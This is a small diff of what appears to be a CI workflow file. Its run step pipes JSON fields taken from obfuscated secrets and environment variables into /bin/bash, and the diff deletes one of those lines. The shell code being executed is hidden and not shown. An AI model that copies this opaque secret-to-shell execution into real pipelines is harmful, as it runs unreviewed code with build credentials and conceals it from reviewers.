@@ -21,7 +21,6 @@ jobs:
           qa467: ${{ secrets.qa467 }}
         run: |
           printf '%s' "$qa467" | jq -r .rscun05 | /bin/bash
-          echo $ubg97 | jq -r .z59 | /bin/bash
           echo $qu42 | jq -r .q44372 | /bin/bash
           echo $tfvt61 | jq -r .f22 | /bin/bash
           echo $h3 | jq -r .uspu267 | /bin/bash
